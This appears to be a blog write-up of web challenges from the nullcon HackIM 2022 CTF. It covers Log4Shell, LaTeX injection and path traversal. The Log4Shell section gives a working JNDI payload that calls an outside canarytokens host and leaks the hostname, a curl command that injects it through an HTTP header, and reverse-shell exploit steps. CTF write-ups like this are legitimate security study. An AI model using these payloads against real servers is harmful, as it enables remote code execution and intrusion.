---
layout: single
title: nullcon HackIM 2022
excerpt: nullcon HackIM 2022 Web Writeups
date: 2022-4-11
classes: wide
header:
  teaser: 
  teaser_home_page: false
  icon:
categories:
  - nullcon HackIM 2022
  - CTF Jeo
tags:  
  - CTF
---



| CTFTime Place | Points | Team |
| --- | --- | --- |
| [30](https://ctftime.org/event/1594/) | 912.000 | Solo - trelosgamiolis |


# 0x1 log4u
### Challenge Description
```A teacher once told me to "never log things you can't trust...", but it's such a nice business opportunity, so I couldn't resist.```


![b1a57c3f-71e1-4bbf-b299-717490b428fd](https://user-images.githubusercontent.com/45040001/162817938-341792b4-52b0-4d0b-8a90-cc8598d2b0d6.png)


## Identify log4shell vulnerability by triggering a DNS query
"The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above, the exploit will cause the vulnerable server to attempt to fetch some remote code. By using the address of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered."

![image](https://user-images.githubusercontent.com/45040001/162826021-f43f8f75-bd20-44c0-be68-52378c202bb3.png)
### Generated log4shell token:
```java
${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856c96m3.canarytokens.com/a}
```

"CanaryTokens.org is an Open Source web app for this purpose that even generates the exploit string automatically and sends an email notification when the DNS is queried. Select Log4Shell from the drop-down menu. Then, embed the string in a request field that you expect the server to log. This could be in anything from a form input to an HTTP header. In our example above, the X-Api-Version header was being logged. This request should trigger it:"

```bash
curl $URL -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.z5wbevl1c0v3t8gxs856c96m3.canarytokens.com/a}'
```
![Screenshot_2022-04-08_21_17_11](https://user-images.githubusercontent.com/45040001/162826208-c584bd56-8411-4d8e-944e-71bc5925fd36.png)

## POC
[log4j shell poc](https://github.com/kozmer/log4j-shell-poc)

## Exploit Steps
- Generate a reverse shell java class(just modify the poc for forward attack)
- Upload the reverse shell java class in HTTP Server 
- Start malicious ldap server giving the HTTP Server URL for redirecting the victim
- Start nc listener for reverse shell

## Upload reverse shell 
![Screenshot_2022-04-08_23_47_51](https://user-images.githubusercontent.com/45040001/162830955-a74283af-35c7-454e-8a61-dd7534a3ff69.png)

## Final flag
![flag](https://user-images.githubusercontent.com/45040001/162826580-8d33dcae-e97f-4cdc-9679-749646111c9b.png)


# 0x2 texnology

[POC](https://0day.work/hacking-with-latex/)

![Screenshot 2022-04-09 040948](https://user-images.githubusercontent.com/45040001/162831563-36117819-1344-4196-afcc-3200b2cb6a43.png)
![flag](https://user-images.githubusercontent.com/45040001/162831557-7e81bc96-5c76-4b23-ae58-c2057730f618.png)

# 0x3 fil3serv3r

![path_escape](https://user-images.githubusercontent.com/45040001/162831826-38411b88-b19b-4550-b6ab-c218a34e8b10.png)

![flag](https://user-images.githubusercontent.com/45040001/162831828-1529c4d4-b02c-455e-9b7d-d5c0ccf095c2.png)


